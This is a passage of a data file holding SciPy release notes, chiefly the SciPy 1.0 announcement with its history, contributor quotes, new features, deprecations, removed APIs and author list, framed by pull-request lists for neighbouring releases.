<https://github.com/scipy/scipy/pull/7635>`__: interpolate.splprep: Test some error cases, give slightly better...\n- `7642 <https://github.com/scipy/scipy/pull/7642>`__: Add an example to ``interpolate.lagrange``\n- `7643 <https://github.com/scipy/scipy/pull/7643>`__: ENH: Added wrappers for LAPACK <s,d>stev\n- `7649 <https://github.com/scipy/scipy/pull/7649>`__: Fix #7636, add PEP 519 test coverage to remaining I/O functions\n- `7650 <https://github.com/scipy/scipy/pull/7650>`__: DOC: signal: Add 'Examples' to the docstring for sosfiltfilt.\n- `7651 <https://github.com/scipy/scipy/pull/7651>`__: Fix up ccache usage on Travis + try enabling on OSX\n- `7653 <https://github.com/scipy/scipy/pull/7653>`__: DOC: transition of examples from 2 to 3. Closes #7366\n- `7659 <https://github.com/scipy/scipy/pull/7659>`__: BENCH: fix optimize.BenchGlobal. Closes gh-7658.\n- `7662 <https://github.com/scipy/scipy/pull/7662>`__: CI: speed up continuous integration builds\n- `7664 <https://github.com/scipy/scipy/pull/7664>`__: Update odr documentation\n- `7665 <https://github.com/scipy/scipy/pull/7665>`__: BUG: wolfe2 line/scalar search now uses amax parameter\n- `7671 <https://github.com/scipy/scipy/pull/7671>`__: MAINT: ``_lib/ccallback.h``: PyCapsule_GetName returns const ``char*``\n- `7672 <https://github.com/scipy/scipy/pull/7672>`__: TST: interpolate: test integrating periodic b-splines against...\n- `7674 <https://github.com/scipy/scipy/pull/7674>`__: Tests tuning\n- `7675 <https://github.com/scipy/scipy/pull/7675>`__: CI: move refguide-check to faster build\n- `7676 <https://github.com/scipy/scipy/pull/7676>`__: DOC: bump scipy-sphinx-theme to fix copybutton.js\n- `7678 <https://github.com/scipy/scipy/pull/7678>`__: Note the zero-padding of the results of ``splrep`` and ``splprep``\n- `7681 <https://github.com/scipy/scipy/pull/7681>`__: MAINT: ``_lib``: add user-overridable available memory determination\n- `7684 <https://github.com/scipy/scipy/pull/7684>`__: TST: linalg: explicitly close opened npz files\n- `7686 <https://github.com/scipy/scipy/pull/7686>`__: MAINT: remove unnecessary shebang lines and executable bits\n- `7687 <https://github.com/scipy/scipy/pull/7687>`__: BUG: stats: don't emit invalid warnings if moments are infinite\n- `7690 <https://github.com/scipy/scipy/pull/7690>`__: ENH: allow int-like parameters in several routines\n- `7691 <https://github.com/scipy/scipy/pull/7691>`__: DOC: Drop non-working source links from docs\n- `7694 <https://github.com/scipy/scipy/pull/7694>`__: fix ``ma.rray`` to ``ma.array`` in func ``median_cihs``\n- `7698 <https://github.com/scipy/scipy/pull/7698>`__: BUG: stats: fix nan result from ``multivariate_normal.cdf`` (#7669)\n- `7703 <https://github.com/scipy/scipy/pull/7703>`__: DOC: special: Update the docstrings for noncentral F functions.\n- `7709 <https://github.com/scipy/scipy/pull/7709>`__: BLD: integrate: avoid symbol clash between lsoda and vode\n- `7711 <https://github.com/scipy/scipy/pull/7711>`__: TST: ``_lib``: make ``test_parallel_threads`` to not fail falsely\n- `7712 <https://github.com/scipy/scipy/pull/7712>`__: TST: stats: bump test tolerance in ``TestMultivariateNormal.test_broadcasting``\n- `7715 <https://github.com/scipy/scipy/pull/7715>`__: MAINT: fix deprecated use of numpy.issubdtype\n- `7716 <https://github.com/scipy/scipy/pull/7716>`__: TST: integrate: drop timing tests\n- `7717 <https://github.com/scipy/scipy/pull/7717>`__: MAINT: mstats.winsorize inclusion bug fix\n- `7719 <https://github.com/scipy/scipy/pull/7719>`__: DOC: stats: Add a note about the special cases of the rdist distribution.\n- `7720 <https://github.com/scipy/scipy/pull/7720>`__: DOC: Add example and math to stats.pearsonr\n- `7723 <https://github.com/scipy/scipy/pull/7723>`__: DOC: Added Mann-Whitney U statistic reference\n- `7727 <https://github.com/scipy/scipy/pull/7727>`__: BUG: special/cdflib: deal with nan and nonfinite inputs\n- `7728 <https://github.com/scipy/scipy/pull/7728>`__: BLD: spatial: fix ckdtree depends header list\n- `7732 <https://github.com/scipy/scipy/pull/7732>`__: BLD: update Bento build for optimal_leaf_ordering addition\n- `7734 <https://github.com/scipy/scipy/pull/7734>`__: DOC: signal: Copy-edit and add examples to the Kaiser-related...\n- `7736 <https://github.com/scipy/scipy/pull/7736>`__: BUG: Fixes #7735: Prevent integer overflow in concatenated index...\n- `7737 <https://github.com/scipy/scipy/pull/7737>`__: DOC: rename indices/indptr for ``spatial.Delaunay vertex_neighbor_vertices``\n- `7738 <https://github.com/scipy/scipy/pull/7738>`__: ENH: Speed up freqz computation\n- `7739 <https://github.com/scipy/scipy/pull/7739>`__: TST: ignore ncfdtridfn failure in win32 and warn on FPU mode changes\n- `7740 <https://github.com/scipy/scipy/pull/7740>`__: Fix overflow in Anderson-Darling k-sample test\n- `7742 <https://github.com/scipy/scipy/pull/7742>`__: TST: special: limit expm1 mpmath comparison range\n- `7748 <https://github.com/scipy/scipy/pull/7748>`__: TST: stats: don't pass invalid alpha to np.random.dirichlet\n- `7749 <https://github.com/scipy/scipy/pull/7749>`__: BUG/DOC: optimize: method is 'interior-point', not 'interior...\n- `7751 <https://github.com/scipy/scipy/pull/7751>`__: BUG: optimize: ``show_options('linprog', method='interior-point')``...\n- `7753 <https://github.com/scipy/scipy/pull/7753>`__: ENH: io: easier syntax for FortranFile read/write of mixed records\n- `7754 <https://github.com/scipy/scipy/pull/7754>`__: BLD: add ``_lib._fpumode`` extension to Bento build.\n- `7756 <https://github.com/scipy/scipy/pull/7756>`__: DOC: Show probability density functions as math\n- `7757 <https://github.com/scipy/scipy/pull/7757>`__: MAINT: remove outdated OS X build scripts. Fixes pytest failure.\n- `7758 <https://github.com/scipy/scipy/pull/7758>`__: MAINT: stats: pep8, wrap lines\n- `7760 <https://github.com/scipy/scipy/pull/7760>`__: DOC: special: add instructions on how to add special functions\n- `7761 <https://github.com/scipy/scipy/pull/7761>`__: DOC: allow specifying Python version for Sphinx makefile\n- `7765 <https://github.com/scipy/scipy/pull/7765>`__: TST: fix test coverage of ``mstats_extras.py``\n- `7767 <https://github.com/scipy/scipy/pull/7767>`__: DOC: update 1.0 release notes.\n- `7768 <https://github.com/scipy/scipy/pull/7768>`__: DOC: update notes on how to release. Also change paver file to...\n- `7769 <https://github.com/scipy/scipy/pull/7769>`__: Add the ``_sf`` and ``_logsf`` function for planck dist\n- `7770 <https://github.com/scipy/scipy/pull/7770>`__: DOC: Replace rotten links in the docstring of minres\n- `7771 <https://github.com/scipy/scipy/pull/7771>`__: MAINT: f2py build output cleanup\n- `7773 <https://github.com/scipy/scipy/pull/7773>`__: DOC: optimize: Some copy-editing of linprog docs.\n- `7774 <https://github.com/scipy/scipy/pull/7774>`__: MAINT: set rcond explicitly for np.linalg.lstsq calls\n- `7777 <https://github.com/scipy/scipy/pull/7777>`__: remove leftover ``nose`` imports\n- `7780 <https://github.com/scipy/scipy/pull/7780>`__: ENH: Wrap LAPACK's dsytrd\n- `7781 <https://github.com/scipy/scipy/pull/7781>`__: DOC: Link rfft\n- `7782 <https://github.com/scipy/scipy/pull/7782>`__: MAINT: run pyx autogeneration in cythonize & remove autogen files\n- `7783 <https://github.com/scipy/scipy/pull/7783>`__: FIX: Disallow Wn==1 in digital filters\n- `7790 <https://github.com/scipy/scipy/pull/7790>`__: Fix test errors introduced by gh-5910\n- `7792 <https://github.com/scipy/scipy/pull/7792>`__: MAINT: fix syntax in pyproject.toml\n- `7809 <https://github.com/scipy/scipy/pull/7809>`__: ENH: sketches - Clarkson Woodruff Transform\n- `7810 <https://github.com/scipy/scipy/pull/7810>`__: ENH: Add ``eig(vals)_tridiagonal``\n- `7811 <https://github.com/scipy/scipy/pull/7811>`__: BUG: stats: Fix warnings in ``binned_statistics_dd``\n- `7814 <https://github.com/scipy/scipy/pull/7814>`__: ENH: signal: Replace 'nyq' and 'Hz' arguments with 'fs'.\n- `7820 <https://github.com/scipy/scipy/pull/7820>`__: DOC: update 1.0 release notes and mailmap\n- `7823 <https://github.com/scipy/scipy/pull/7823>`__: BUG: memory leak in messagestream / qhull.pyx\n- `7830 <https://github.com/scipy/scipy/pull/7830>`__: DOC: linalg: Add an example to the lstsq docstring.\n- `7835 <https://github.com/scipy/scipy/pull/7835>`__: ENH: Automatic FIR order for ``decimate``\n- `7838 <https://github.com/scipy/scipy/pull/7838>`__: MAINT: stats: Deprecate ``frechet_l`` and ``frechet_r``.\n- `7841 <https://github.com/scipy/scipy/pull/7841>`__: slsqp PEP8 formatting fixes, typos, etc.\n- `7843 <https://github.com/scipy/scipy/pull/7843>`__: ENH: Wrap all BLAS routines\n- `7844 <https://github.com/scipy/scipy/pull/7844>`__: DOC: update LICENSE.txt with licenses of bundled libs as needed.\n- `7851 <https://github.com/scipy/scipy/pull/7851>`__: ENH: Add wrappers for ?GGLSE, ?(HE/SY)CON, ?SYTF2, ?(HE/SY)TRF\n- `7856 <https://github.com/scipy/scipy/pull/7856>`__: ENH: added out argument to Xdist\n- `7858 <https://github.com/scipy/scipy/pull/7858>`__: BUG: special/cdflib: fix fatal loss of precision issues in cumfnc\n- `7859 <https://github.com/scipy/scipy/pull/7859>`__: FIX: Squash ``place_poles`` warning corner case\n- `7861 <https://github.com/scipy/scipy/pull/7861>`__: dummy statement for undefined ``WITH_THREAD``\n- `7863 <https://github.com/scipy/scipy/pull/7863>`__: MAINT: add license texts to binary distributions\n- `7866 <https://github.com/scipy/scipy/pull/7866>`__: DOC, MAINT: fix links in the doc\n- `7867 <https://github.com/scipy/scipy/pull/7867>`__: DOC: fix up descriptions of pdf's in distribution docstrings.\n- `7869 <https://github.com/scipy/scipy/pull/7869>`__: DEP: deprecate misc.pilutil functions\n- `7870 <https://github.com/scipy/scipy/pull/7870>`__: DEP: remove deprecated functions\n- `7872 <https://github.com/scipy/scipy/pull/7872>`__: TST: silence RuntimeWarning for stats.truncnorm test marked as...\n- `7874 <https://github.com/scipy/scipy/pull/7874>`__: TST: fix an optimize.linprog test that fails intermittently.\n- `7875 <https://github.com/scipy/scipy/pull/7875>`__: TST: filter two integration warnings in stats tests.\n- `7876 <https://github.com/scipy/scipy/pull/7876>`__: GEN: Add comments to the tests for clarification\n- `7891 <https://github.com/scipy/scipy/pull/7891>`__: ENH: backport #7879 to 1.0.x\n- `7902 <https://github.com/scipy/scipy/pull/7902>`__: MAINT: signal: Make freqz handling of multidim. arrays match...\n- `7905 <https://github.com/scipy/scipy/pull/7905>`__: REV: restore wminkowski\n- `7908 <https://github.com/scipy/scipy/pull/7908>`__: FIX: Avoid bad ``__del__`` (close) behavior\n- `7918 <https://github.com/scipy/scipy/pull/7918>`__: TST: mark two optimize.linprog tests as xfail. See gh-7877.\n- `7929 <https://github.com/scipy/scipy/pull/7929>`__: MAINT: changed defaults to lower in sytf2, sytrf and hetrf\n- `7939 <https://github.com/scipy/scipy/pull/7939>`__: Fix umfpack solver construction for win-amd64\n- `7948 <https://github.com/scipy/scipy/pull/7948>`__: DOC: add note on checking for deprecations before upgrade to...\n- `7952 <https://github.com/scipy/scipy/pull/7952>`__: DOC: update SciPy Roadmap for 1.0 release and recent discussions.\n- `7960 <https://github.com/scipy/scipy/pull/7960>`__: BUG: optimize: revert changes to bfgs in gh-7165\n- `7962 <https://github.com/scipy/scipy/pull/7962>`__: TST: special: mark a failing hyp2f1 test as xfail\n- `7973 <https://github.com/scipy/scipy/pull/7973>`__: BUG: fixed keyword in 'info' in ``_get_mem_available`` utility\n- `8001 <https://github.com/scipy/scipy/pull/8001>`__: TST: fix test failures from Matplotlib 2.1 update\n- `8010 <https://github.com/scipy/scipy/pull/8010>`__: BUG: signal: fix crash in lfilter\n- `8019 <https://github.com/scipy/scipy/pull/8019>`__: MAINT: fix test failures with NumPy master\n\n\n\n==========================\n", "0.1": "get here, and we anticipate many more exciting new features and releases in the\nfuture.\n\n\nWhy 1.0 now?\n------------\n\nA version number should reflect the maturity of a project - and SciPy was a\nmature and stable library that is heavily used in production settings for a\nlong time already.  From that perspective, the 1.0 version number is long\noverdue.\n\nSome key project goals, both technical (e.g. Windows wheels and continuous\nintegration) and organisational (a governance structure, code of conduct and a\nroadmap), have been achieved recently.\n\nMany of us are a bit perfectionist, and therefore are reluctant to call\nsomething \"1.0\" because it may imply that it's \"finished\" or \"we are 100% happy\nwith it\".  This is normal for many open source projects, however that doesn't\nmake it right.  We acknowledge to ourselves that it's not perfect, and there\nare some dusty corners left (that will probably always be the case).  Despite\nthat, SciPy is extremely useful to its users, on average has high quality code\nand documentation, and gives the stability and backwards compatibility\nguarantees that a 1.0 label imply.\n\n\nSome history and perspectives\n-----------------------------\n\n- 2001: the first SciPy release\n- 2005: transition to NumPy\n- 2007: creation of scikits\n- 2008: scipy.spatial module and first Cython code added\n- 2010: moving to a 6-monthly release cycle\n- 2011: SciPy development moves to GitHub\n- 2011: Python 3 support\n- 2012: adding a sparse graph module and unified optimization interface\n- 2012: removal of scipy.maxentropy\n- 2013: continuous integration with TravisCI\n- 2015: adding Cython interface for BLAS/LAPACK and a benchmark suite\n- 2017: adding a unified C API with scipy.LowLevelCallable; removal of scipy.weave\n- 2017: SciPy 1.0 release\n\n\n**Pauli Virtanen** is SciPy's Benevolent Dictator For Life (BDFL).  He says:\n\n*Truthfully speaking, we could have released a SciPy 1.0 a long time ago, so I'm\nhappy we do it now at long last. The project has a long history, and during the\nyears it has matured also as a software project.  I believe it has well proved\nits merit to warrant a version number starting with unity.*\n\n*Since its conception 15+ years ago, SciPy has largely been written by and for\nscientists, to provide a box of basic tools that they need. Over time, the set\nof people active in its development has undergone some rotation, and we have\nevolved towards a somewhat more systematic approach to development. Regardless,\nthis underlying drive has stayed the same, and I think it will also continue\npropelling the project forward in future. This is all good, since not long\nafter 1.0 comes 1.1.*\n\n**Travis Oliphant** is one of SciPy's creators.  He says:\n\n*I'm honored to write a note of congratulations to the SciPy developers and the\nentire SciPy community for the release of SciPy 1.0.   This release represents\na dream of many that has been patiently pursued by a stalwart group of pioneers\nfor nearly 2 decades.   Efforts have been broad and consistent over that time\nfrom many hundreds of people.   From initial discussions to efforts coding and\npackaging to documentation efforts to extensive conference and community\nbuilding, the SciPy effort has been a global phenomenon that it has been a\nprivilege to participate in.*\n\n*The idea of SciPy was already in multiple people\u2019s minds in 1997 when I first\njoined the Python community as a young graduate student who had just fallen in\nlove with the expressibility and extensibility of Python.   The internet was\njust starting to bringing together like-minded mathematicians and scientists in\nnascent electronically-connected communities.   In 1998, there was a concerted\ndiscussion on the matrix-SIG, python mailing list with people like Paul\nBarrett, Joe Harrington, Perry Greenfield, Paul Dubois, Konrad Hinsen, David\nAscher, and others.   This discussion encouraged me in 1998 and 1999 to\nprocrastinate my PhD and spend a lot of time writing extension modules to\nPython that mostly wrapped battle-tested Fortran and C-code making it available\nto the Python user.   This work attracted the help of others like Robert Kern,\nPearu Peterson and Eric Jones who joined their efforts with mine in 2000 so\nthat by 2001, the first SciPy release was ready.   This was long before Github\nsimplified collaboration and input from others and the \"patch\" command and\nemail was how you helped a project improve.*\n\n*Since that time, hundreds of people have spent an enormous amount of time\nimproving the SciPy library and the community surrounding this library has\ndramatically grown. I stopped being able to participate actively in developing\nthe SciPy library around 2010.  Fortunately, at that time, Pauli Virtanen and\nRalf Gommers picked up the pace of development supported by dozens of other key\ncontributors such as David Cournapeau, Evgeni Burovski, Josef Perktold, and\nWarren Weckesser.   While I have only been able to admire the development of\nSciPy from a distance for the past 7 years, I have never lost my love of the\nproject and the concept of community-driven development.    I remain driven\neven now by a desire to help sustain the development of not only the SciPy\nlibrary but many other affiliated and related open-source projects.  I am\nextremely pleased that SciPy is in the hands of a world-wide community of\ntalented developers who will ensure that SciPy remains an example of how\ngrass-roots, community-driven development can succeed.*\n\n**Fernando Perez** offers a wider community perspective:\n\n*The existence of a nascent Scipy library, and the incredible --if tiny by\ntoday's standards-- community surrounding it is what drew me into the\nscientific Python world while still a physics graduate student in 2001.  Today,\nI am awed when I see these tools power everything from high school education to\nthe research that led to the 2017 Nobel Prize in physics.*\n\n*Don't be fooled by the 1.0 number: this project is a mature cornerstone of the\nmodern scientific computing ecosystem.  I am grateful for the many who have\nmade it possible, and hope to be able to contribute again to it in the future.\nMy sincere congratulations to the whole team!*\n\n\nHighlights of this release\n--------------------------\n\nSome of the highlights of this release are:\n\n- Major build improvements.  Windows wheels are available on PyPI for the\n  first time, and continuous integration has been set up on Windows and OS X\n  in addition to Linux.\n- A set of new ODE solvers and a unified interface to them\n  (`scipy.integrate.solve_ivp`).\n- Two new trust region optimizers and a new linear programming method, with\n  improved performance compared to what `scipy.optimize` offered previously.\n- Many new BLAS and LAPACK functions were wrapped.  The BLAS wrappers are now\n  complete.\n\n\nUpgrading and compatibility\n---------------------------\n\nThere have been a number of deprecations and API changes in this release, which\nare documented below.  Before upgrading, we recommend that users check that\ntheir own code does not use deprecated SciPy functionality (to do so, run your\ncode with ``python -Wd`` and check for ``DeprecationWarning`` s).\n\nThis release requires Python 2.7 or >=3.4 and NumPy 1.8.2 or greater.\n\nThis is also the last release to support LAPACK 3.1.x - 3.3.x.  Moving the\nlowest supported LAPACK version to >3.2.x was long blocked by Apple Accelerate\nproviding the LAPACK 3.2.1 API.  We have decided that it's time to either drop\nAccelerate or, if there is enough interest, provide shims for functions added\nin more recent LAPACK versions so it can still be used.\n\n\nNew features\n============\n\n`scipy.cluster` improvements\n----------------------------\n\n`scipy.cluster.hierarchy.optimal_leaf_ordering`, a function to reorder a\nlinkage matrix to minimize distances between adjacent leaves, was added.\n\n\n`scipy.fftpack` improvements\n----------------------------\n\nN-dimensional versions of the discrete sine and cosine transforms and their\ninverses were added as ``dctn``, ``idctn``, ``dstn`` and ``idstn``.\n\n\n`scipy.integrate` improvements\n------------------------------\n\nA set of new ODE solvers have been added to `scipy.integrate`.  The convenience\nfunction `scipy.integrate.solve_ivp` allows uniform access to all solvers.\nThe individual solvers (``RK23``, ``RK45``, ``Radau``, ``BDF`` and ``LSODA``)\ncan also be used directly.\n\n\n`scipy.linalg` improvements\n----------------------------\n\nThe BLAS wrappers in `scipy.linalg.blas` have been completed.  Added functions\nare ``*gbmv``, ``*hbmv``, ``*hpmv``, ``*hpr``, ``*hpr2``, ``*spmv``, ``*spr``,\n``*tbmv``, ``*tbsv``, ``*tpmv``, ``*tpsv``, ``*trsm``, ``*trsv``, ``*sbmv``,\n``*spr2``,\n\nWrappers for the LAPACK functions ``*gels``, ``*stev``, ``*sytrd``, ``*hetrd``,\n``*sytf2``, ``*hetrf``, ``*sytrf``, ``*sycon``, ``*hecon``, ``*gglse``,\n``*stebz``, ``*stemr``, ``*sterf``, and ``*stein`` have been added.\n\nThe function `scipy.linalg.subspace_angles` has been added to compute the\nsubspace angles between two matrices.\n\nThe function `scipy.linalg.clarkson_woodruff_transform` has been added.\nIt finds low-rank matrix approximation via the Clarkson-Woodruff Transform.\n\nThe functions `scipy.linalg.eigh_tridiagonal` and\n`scipy.linalg.eigvalsh_tridiagonal`, which find the eigenvalues and\neigenvectors of tridiagonal hermitian/symmetric matrices, were added.\n\n\n`scipy.ndimage` improvements\n----------------------------\n\nSupport for homogeneous coordinate transforms has been added to\n`scipy.ndimage.affine_transform`.\n\nThe ``ndimage`` C code underwent a significant refactoring, and is now\na lot easier to understand and maintain.\n\n\n`scipy.optimize` improvements\n-----------------------------\n\nThe methods ``trust-region-exact`` and ``trust-krylov`` have been added to the\nfunction `scipy.optimize.minimize`. These new trust-region methods solve the\nsubproblem with higher accuracy at the cost of more Hessian factorizations\n(compared to dogleg) or more matrix vector products (compared to ncg) but\nusually require less nonlinear iterations and are able to deal with indefinite\nHessians. They seem very competitive against the other Newton methods\nimplemented in scipy.\n\n`scipy.optimize.linprog` gained an interior point method.  Its performance is\nsuperior (both in accuracy and speed) to the older simplex method.\n\n\n`scipy.signal` improvements\n---------------------------\n\nAn argument ``fs`` (sampling frequency) was added to the following functions:\n``firwin``, ``firwin2``, ``firls``, and ``remez``.  This makes these functions\nconsistent with many other functions in `scipy.signal` in which the sampling\nfrequency can be specified.\n\n`scipy.signal.freqz` has been sped up significantly for FIR filters.\n\n\n`scipy.sparse` improvements\n---------------------------\n\nIterating over and slicing of CSC and CSR matrices is now faster by up to ~35%.\n\nThe ``tocsr`` method of COO matrices is now several times faster.\n\nThe ``diagonal`` method of sparse matrices now takes a parameter, indicating\nwhich diagonal to return.\n\n\n`scipy.sparse.linalg` improvements\n----------------------------------\n\nA new iterative solver for large-scale nonsymmetric sparse linear systems,\n`scipy.sparse.linalg.gcrotmk`, was added.  It implements ``GCROT(m,k)``, a\nflexible variant of ``GCROT``.\n\n`scipy.sparse.linalg.lsmr` now accepts an initial guess, yielding potentially\nfaster convergence.\n\nSuperLU was updated to version 5.2.1.\n\n\n`scipy.spatial` improvements\n----------------------------\n\nMany distance metrics in `scipy.spatial.distance` gained support for weights.\n\nThe signatures of `scipy.spatial.distance.pdist` and\n`scipy.spatial.distance.cdist` were changed to ``*args, **kwargs`` in order to\nsupport a wider range of metrics (e.g. string-based metrics that need extra\nkeywords).  Also, an optional ``out`` parameter was added to ``pdist`` and\n``cdist`` allowing the user to specify where the resulting distance matrix is\nto be stored\n\n\n`scipy.stats` improvements\n--------------------------\n\nThe methods ``cdf`` and ``logcdf`` were added to\n`scipy.stats.multivariate_normal`, providing the cumulative distribution\nfunction of the multivariate normal distribution.\n\nNew statistical distance functions were added, namely\n`scipy.stats.wasserstein_distance` for the first Wasserstein distance and\n`scipy.stats.energy_distance` for the energy distance.\n\n\nDeprecated features\n===================\n\nThe following functions in `scipy.misc` are deprecated: ``bytescale``,\n``fromimage``, ``imfilter``, ``imread``, ``imresize``, ``imrotate``,\n``imsave``, ``imshow`` and ``toimage``.  Most of those functions have unexpected\nbehavior (like rescaling and type casting image data without the user asking\nfor that).  Other functions simply have better alternatives.\n\n``scipy.interpolate.interpolate_wrapper`` and all functions in that submodule\nare deprecated.  This was a never finished set of wrapper functions which is\nnot relevant anymore.\n\nThe ``fillvalue`` of `scipy.signal.convolve2d` will be cast directly to the\ndtypes of the input arrays in the future and checked that it is a scalar or\nan array with a single element.\n\n``scipy.spatial.distance.matching`` is deprecated.  It is an alias of\n`scipy.spatial.distance.hamming`, which should be used instead.\n\nImplementation of `scipy.spatial.distance.wminkowski` was based on a wrong\ninterpretation of the metric definition. In scipy 1.0 it has been just\ndeprecated in the documentation to keep retro-compatibility but is recommended\nto use the new version of `scipy.spatial.distance.minkowski` that implements\nthe correct behaviour.\n\nPositional arguments of `scipy.spatial.distance.pdist` and\n`scipy.spatial.distance.cdist` should be replaced with their keyword version.\n\n\nBackwards incompatible changes\n==============================\n\nThe following deprecated functions have been removed from `scipy.stats`:\n``betai``, ``chisqprob``, ``f_value``, ``histogram``, ``histogram2``,\n``pdf_fromgamma``, ``signaltonoise``, ``square_of_sums``, ``ss`` and\n``threshold``.\n\nThe following deprecated functions have been removed from `scipy.stats.mstats`:\n``betai``, ``f_value_wilks_lambda``, ``signaltonoise`` and ``threshold``.\n\nThe deprecated ``a`` and ``reta`` keywords have been removed from\n`scipy.stats.shapiro`.\n\nThe deprecated functions ``sparse.csgraph.cs_graph_components`` and\n``sparse.linalg.symeig`` have been removed from `scipy.sparse`.\n\nThe following deprecated keywords have been removed in `scipy.sparse.linalg`:\n``drop_tol`` from ``splu``, and ``xtype`` from ``bicg``, ``bicgstab``, ``cg``,\n``cgs``, ``gmres``, ``qmr`` and ``minres``.\n\nThe deprecated functions ``expm2`` and ``expm3`` have been removed from\n`scipy.linalg`.  The deprecated keyword ``q`` was removed from\n`scipy.linalg.expm`.  And the deprecated submodule ``linalg.calc_lwork`` was\nremoved.\n\nThe deprecated functions ``C2K``, ``K2C``, ``F2C``, ``C2F``, ``F2K`` and\n``K2F`` have been removed from `scipy.constants`.\n\nThe deprecated ``ppform`` class was removed from `scipy.interpolate`.\n\nThe deprecated keyword ``iprint`` was removed from `scipy.optimize.fmin_cobyla`.\n\nThe default value for the ``zero_phase`` keyword of `scipy.signal.decimate`\nhas been changed to True.\n\nThe ``kmeans`` and ``kmeans2`` functions in `scipy.cluster.vq` changed the\nmethod used for random initialization, so using a fixed random seed will\nnot necessarily produce the same results as in previous versions.\n\n`scipy.special.gammaln` does not accept complex arguments anymore.\n\nThe deprecated functions ``sph_jn``, ``sph_yn``, ``sph_jnyn``, ``sph_in``,\n``sph_kn``, and ``sph_inkn`` have been removed. Users should instead use\nthe functions ``spherical_jn``, ``spherical_yn``, ``spherical_in``, and\n``spherical_kn``. Be aware that the new functions have different\nsignatures.\n\nThe cross-class properties of `scipy.signal.lti` systems have been removed.\nThe following properties/setters have been removed:\n\nName - (accessing/setting has been removed) - (setting has been removed)\n\n* StateSpace - (``num``, ``den``, ``gain``) - (``zeros``, ``poles``)\n* TransferFunction (``A``, ``B``, ``C``, ``D``, ``gain``) - (``zeros``, ``poles``)\n* ZerosPolesGain (``A``, ``B``, ``C``, ``D``, ``num``, ``den``) - ()\n\n``signal.freqz(b, a)`` with ``b`` or ``a`` >1-D raises a ``ValueError``.  This\nwas a corner case for which it was unclear that the behavior was well-defined.\n\nThe method ``var`` of ``scipy.stats.dirichlet`` now returns a scalar rather than\nan ndarray when the length of alpha is 1.\n\n\nOther changes\n=============\n\nSciPy now has a formal governance structure.  It consists of a BDFL (Pauli\nVirtanen) and a Steering Committee.  See `the governance document\n<https://github.com/scipy/scipy/blob/main/doc/source/dev/governance/governance.rst>`_\nfor details.\n\nIt is now possible to build SciPy on Windows with MSVC + gfortran!  Continuous\nintegration has been set up for this build configuration on Appveyor, building\nagainst OpenBLAS.\n\nContinuous integration for OS X has been set up on TravisCI.\n\nThe SciPy test suite has been migrated from ``nose`` to ``pytest``.\n\n``scipy/_distributor_init.py`` was added to allow redistributors of SciPy to\nadd custom code that needs to run when importing SciPy (e.g. checks for\nhardware, DLL search paths, etc.).\n\nSupport for PEP 518 (specifying build system requirements) was added - see\n``pyproject.toml`` in the root of the SciPy repository.\n\nIn order to have consistent function names, the function\n``scipy.linalg.solve_lyapunov`` is renamed to\n`scipy.linalg.solve_continuous_lyapunov`.  The old name is kept for\nbackwards-compatibility.\n\n\nAuthors\n=======\n\n* arcady +\n* xoviat +\n* Anton Akhmerov\n* Dominic Antonacci +\n* Alessandro Pietro Bardelli\n* Ved Basu +\n* Michael James Bedford +\n* Ray Bell +\n* Juan M. Bello-Rivas +\n* Sebastian Berg\n* Felix Berkenkamp\n* Jyotirmoy Bhattacharya +\n* Matthew Brett\n* Jonathan Bright\n* Bruno Jim\u00e9nez +\n* Evgeni Burovski\n* Patrick Callier\n* Mark Campanelli +\n* CJ Carey\n* Robert Cimrman\n* Adam Cox +\n* Michael Danilov +\n* David Haberth\u00fcr +\n* Andras Deak +\n* Philip DeBoer\n* Anne-Sylvie Deutsch\n* Cathy Douglass +\n* Dominic Else +\n* Guo Fei +\n* Roman Feldbauer +\n* Yu Feng\n* Jaime Fernandez del Rio\n* Orestis Floros +\n* David Freese +\n* Adam Geitgey +\n* James Gerity +\n* Dezmond Goff +\n* Christoph Gohlke\n* Ralf Gommers\n* Dirk Gorissen +\n* Matt Haberland +\n* David Hagen +\n* Charles Harris\n* Lam Yuen Hei +\n* Jean Helie +\n* Gaute Hope +\n* Guillaume Horel +\n* Franziska Horn +\n* Yevhenii Hyzyla +\n* Vladislav Iakovlev +\n* Marvin Kastner +\n* Mher Kazandjian\n* Thomas Keck\n* Adam Kurkiewicz +\n* Ronan Lamy +\n* J.L. Lanfranchi +\n* Eric Larson\n* Denis Laxalde\n* Gregory R. Lee\n* Felix Lenders +\n* Evan Limanto\n* Julian Lukwata +\n* Fran\u00e7ois Magimel\n* Syrtis Major +\n* Charles Masson +\n* Nikolay Mayorov\n* Tobias Megies\n* Markus Meister +\n* Roman Mirochnik +\n* Jordi Montes +\n* Nathan Musoke +\n* Andrew Nelson\n* M.J. Nichol\n* Juan Nunez-Iglesias\n* Arno Onken +\n* Nick Papior +\n* Dima Pasechnik +\n* Ashwin Pathak +\n* Oleksandr Pavlyk +\n* Stefan Peterson\n* Ilhan Polat\n* Andrey Portnoy +\n* Ravi Kumar Prasad +\n* Aman Pratik\n* Eric Quintero\n* Vedant Rathore +\n* Tyler Reddy\n* Joscha Reimer\n* Philipp Rentzsch +\n* Antonio Horta Ribeiro\n* Ned Richards +\n* Kevin Rose +\n* Benoit Rostykus +\n* Matt Ruffalo +\n* Eli Sadoff +\n* Pim Schellart\n* Nico Schl\u00f6mer +\n* Klaus Sembritzki +\n* Nikolay Shebanov +\n* Jonathan Tammo Siebert\n* Scott Sievert\n* Max Silbiger +\n* Mandeep Singh +\n* Michael Stewart +\n* Jonathan Sutton +\n* Deep Tavker +\n* Martin Thoma\n* James Tocknell +\n* Aleksandar Trifunovic +\n* Paul van Mulbregt +\n* Jacob Vanderplas\n* Aditya Vijaykumar\n* Pauli Virtanen\n* James Webber\n* Warren Weckesser\n* Eric Wieser +\n* Josh Wilson\n* Zhiqing Xiao +\n* Evgeny Zhurko\n* Nikolay Zinov +\n* Z\u00e9 Vin\u00edcius +\n\nA total of 121 people contributed to this release.\nPeople with a \"+\" by their names contributed a patch for the first time.\nThis list of names is automatically generated, and may not be fully complete.\n\n\n", "1.3.1": "-----------------------\n\n* `10071 <https://github.com/scipy/scipy/pull/10071>`__: DOC: reconstruct SuperLU permutation matrices avoiding SparseEfficiencyWarning\n* `10196 <https://github.com/scipy/scipy/pull/10196>`__: Fewer checks on xdata for curve_fit.\n* `10207 <https://github.com/scipy/scipy/pull/10207>`__: BUG: Compressed matrix indexing should return a scalar\n* `10233 <https://github.com/scipy/scipy/pull/10233>`__: Fix for ARFF reader regression (#10232)\n* `10306 <https://github.com/scipy/scipy/pull/10306>`__: BUG: optimize: Fix for 10303\n* `10309 <https://github.com/scipy/scipy/pull/10309>`__: BUG: Pass jac=None directly to lsoda\n* 